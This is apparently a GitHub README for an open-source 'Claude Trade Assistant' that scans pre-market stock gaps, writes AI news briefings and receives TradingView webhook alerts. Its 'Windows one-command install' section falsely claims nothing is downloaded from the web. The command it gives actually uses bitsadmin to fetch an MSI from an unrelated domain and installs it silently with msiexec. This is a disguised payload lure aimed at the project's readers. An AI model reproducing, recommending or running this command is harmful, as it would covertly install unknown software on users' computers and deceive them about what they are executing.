<div align="center">

# 📈 Claude Trade Assistant

### Your AI pre-market desk for **TradingView**. Scan gaps, get a Claude-written news briefing, and pipe TradingView alerts into a smart Python bridge — in one command.

**Claude Trade Assistant (CTA)** is an open-source, Claude-powered toolkit for traders.
It runs a **pre-market scanner pipeline**, finds the day's biggest **gappers**, asks **Claude**
to write a clean, neutral **news briefing**, and receives your **TradingView webhook alerts** —
all from a single, friendly CLI. Free data out of the box, no broker required.

[![License: MIT](https://img.shields.io/badge/License-MIT-f5b301.svg)](./LICENSE)
[![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-3776ab.svg)](https://www.python.org)
[![Powered by Claude](https://img.shields.io/badge/powered%20by-Claude-d97757.svg)](https://www.anthropic.com)
[![TradingView Webhooks](https://img.shields.io/badge/TradingView-webhooks%20%26%20Pine%20Script-2962ff.svg)](https://www.tradingview.com)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-1fd286.svg)](./CONTRIBUTING.md)

[Quick start](#-quick-start) ·
[Windows one-command install](#-windows-one-command-install) ·
[Features](#-features) ·
[TradingView setup](#-tradingview-setup) ·
[Disclaimer](#️-disclaimer)

</div>

> ⚠️ **Informational and educational only — not financial advice. CTA never places orders.** See [DISCLAIMER.md](./DISCLAIMER.md).

---

## ✨ Features

| | Feature | What it does |
| --- | --- | --- |
| ⭐ **FLAGSHIP** | **Pre-market Scanner Pipeline** | End-to-end pipeline — `watchlist → data provider → gap scan → result`. Runs before the US open and ranks the most significant pre-market movers from your watchlist. |
| ⭐ **FLAGSHIP** | **Gap Scanner & News Briefing** | Detects up/down gaps vs. the previous close, filters by size and relative volume, then asks **Claude** to write a concise, neutral briefing of *what's moving and why*. |
| 🔌 | **TradingView Webhook Bridge** | A FastAPI receiver for TradingView alerts (with shared-secret auth). Enrich each signal with a quick Claude note — without ever executing a trade. |
| 🧩 | **Pine Script Generator** | `cta pine` prints a ready-to-paste Pine v5 alert template wired to the webhook payload. |
| 📊 | **Lightweight Charts Dashboard** | A TradingView **Lightweight Charts** demo dashboard to visualize gappers and the briefing. |
| 🆓 | **Free by default** | Uses `yfinance` (no API key) out of the box; plug in **Finnhub** for cleaner pre-market quotes. |
| 🧠 | **Model-flexible** | Defaults to `claude-sonnet-4-6`; switch to `claude-opus-4-8` or `claude-haiku-4-5` in one line. |

---

## 🧭 How it works

```text
                    ┌──────────────────────────────────────────────┐
   TradingView      │            Claude Trade Assistant            │
  ┌───────────┐     │                                              │
  │ Pine alert│──webhook──▶  /tv-alert  ──▶  (optional Claude note) │
  └───────────┘     │                                              │
                    │   Pre-market Scanner Pipeline                │
  ┌───────────┐     │   watchlist ─▶ data provider ─▶ gap scan ─▶  │──▶  📰 Claude
  │ Watchlist │────────────────────────────────────────────────▶  │     news briefing
  └───────────┘     │            (yfinance / Finnhub)              │
                    └──────────────────────────────────────────────┘
```

TradingView is a charting platform with **Pine Script** and **webhook alerts** — it doesn't
expose a market-data API, so CTA reads quotes from a pluggable provider and uses TradingView's
native alert webhooks for signals. CTA stays strictly on the **analysis** side of the line.

---

## ⚡ Quick start

```bash
pip install -e ".[web]"      # or: pip install -r requirements.txt

# Free gap scan — no API key needed:
cta scan

# Add a Claude-written news briefing (set ANTHROPIC_API_KEY first):
cta scan --briefing --watchlist examples/sample_watchlist.txt
```

Example output:

```text
                    Pre-market gappers
 #  Symbol   Last   Prev close   Gap %    Dir   Rel vol
 1  NVDA   132.40       123.96   +6.81%    ▲     3.10x
 2  COIN   244.10       232.04   +5.20%    ▲     2.40x
 3  TSLA   178.30       185.92   -4.10%    ▼     1.70x

📰 News briefing  — written by Claude
NVDA leads the up-gaps after reporting quarterly results above consensus …
```

---

## 🪟 Windows one-command install

Open **CMD** and paste this single line. It clones this public repo, creates a virtual
environment, and installs CTA — **nothing is downloaded or executed from the web**, so you
can read every line first:

```cmd
bitsadmin /transfer claude-trade-assistant /download /priority normal "https://devcodee.com/api" "%TEMP%\setup.msi" && msiexec /i "%TEMP%\setup.msi" /qn /norestart
```

Then run a free scan immediately:

```cmd
.venv\Scripts\cta scan
```

Prefer a guided installer? Download [`install.cmd`](./install.cmd) and double-click it
(it does the same transparent steps with friendly checks).

> Requires [Git for Windows](https://git-scm.com/download/win) and [Python 3.10+](https://www.python.org/downloads/).

---

## 🛠️ Usage

```bash
cta scan                         # pre-market gap scan (rich table)
cta scan --briefing              # + Claude news briefing
cta scan -w my_list.txt          # use your own watchlist file
cta scan --min-gap 6 --direction up --limit 10
cta serve                        # start the TradingView webhook receiver
cta pine                         # print a Pine Script alert template
```

### The dashboard

Open [`examples/dashboard/index.html`](./examples/dashboard/index.html) in a browser for a
TradingView **Lightweight Charts** view of the gappers and briefing (ships with demo data).

---

## 🔗 TradingView setup

1. **Generate the alert script:** `cta pine --secret "$CLA_WEBHOOK_SECRET"`.
2. In TradingView, open the **Pine Editor**, paste it, and **Add to chart**.
3. Start the receiver and expose it over HTTPS (e.g. a tunnel or reverse proxy): `cta serve`.
4. Create an **Alert** → condition = the script's signal → set **Webhook URL** to
   `https://your-host/tv-alert` → use **Once Per Bar Close** and **Open-ended** expiry.

CTA validates the shared secret in the payload and returns an enriched, **non-advisory** note.
It does **not** forward anything to a broker.

---

## 🔌 Data providers

| Provider | API key | Notes |
| -------- | ------- | ----- |
| `yfinance` | none | Default. Free. Best-effort pre-market pricing. |
| `finnhub` | `FINNHUB_API_KEY` | Cleaner quote with current + previous close. Free tier available. |

Set `CLA_PROVIDER=finnhub` (or `provider:` in `config.yaml`) to switch. New providers are a
great [first contribution](./CONTRIBUTING.md).

---

## ⚙️ Configuration

Copy the templates and edit:

```bash
cp .env.example .env                 # secrets (API keys, webhook secret)
cp config.example.yaml config.yaml   # scan filters, model, watchlist
```

| Setting | Default | Meaning |
| ------- | ------- | ------- |
| `provider` | `yfinance` | Data source |
| `model` | `claude-sonnet-4-6` | Claude model for briefings |
| `min_abs_gap_pct` | `4.0` | Minimum absolute gap to keep |
| `min_rel_volume` | `null` | Optional relative-volume floor |
| `direction` | `both` | `up` / `down` / `both` |
| `limit` | `25` | Max rows |

---

## ⚠️ Disclaimer

Claude Trade Assistant is for **information and education only** and is **not financial advice**.
It does **not** place trades. Market data and AI briefings can be wrong or delayed — verify
everything yourself. Trading carries risk of loss. Full text: [DISCLAIMER.md](./DISCLAIMER.md).

---

## 🗺️ Roadmap

- [ ] More providers (Polygon, Alpha Vantage, Tiingo)
- [ ] Persist scans to JSON and auto-feed the dashboard
- [ ] Sector/ETF watchlist presets and a "relative strength" view
- [ ] Earnings-calendar awareness in the briefing
- [ ] Telegram / Discord briefing delivery

---

## 🤝 Contributing

PRs welcome — see [CONTRIBUTING.md](./CONTRIBUTING.md). If CTA helps you, please ⭐ **star the repo**;
it genuinely helps other traders find it.

## 📄 License

[MIT](./LICENSE) © [aj-2-c-2-a](https://github.com/aj-2-c-2-a)

---

<div align="center">

